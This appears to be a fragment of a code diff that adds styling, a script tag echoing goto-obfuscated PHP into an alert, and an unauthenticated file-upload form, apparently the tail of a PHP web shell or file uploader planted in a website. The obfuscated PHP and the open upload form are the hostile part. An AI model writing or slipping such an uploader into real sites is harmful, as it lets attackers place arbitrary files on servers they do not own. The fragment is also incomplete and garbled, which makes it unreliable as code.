+	color: #e74c3c
+}
+
+.vn-green a {
+	background: #27ae60;
+	padding: 10px;
+	color: #fff;
+}
+
+.vn-green a:hover {
+	color: red;
+	background: #21894d;
+	text-decoration: none;
+}
+</style>
+<script type="text/javascript">alert(<?php  goto ONmgf;
+     terM6: ?>);</script>
+<?php  goto lgIu4;
+     lgIu4:
+ } goto acC90; qkhAz: CJNkO: goto nYmSZ; bM1qs: Guyes: goto Dn0ba; Y4e5u: ?>
+	<form method="post" enctype="multipart/form-data">
+		<center>
+			<input class="btn" type="file" name="file" />
+			<input class="btn btn-danger" name="upl" type="submit" value="Save">
+		</center>
+	</form>
+</body>
+</html>
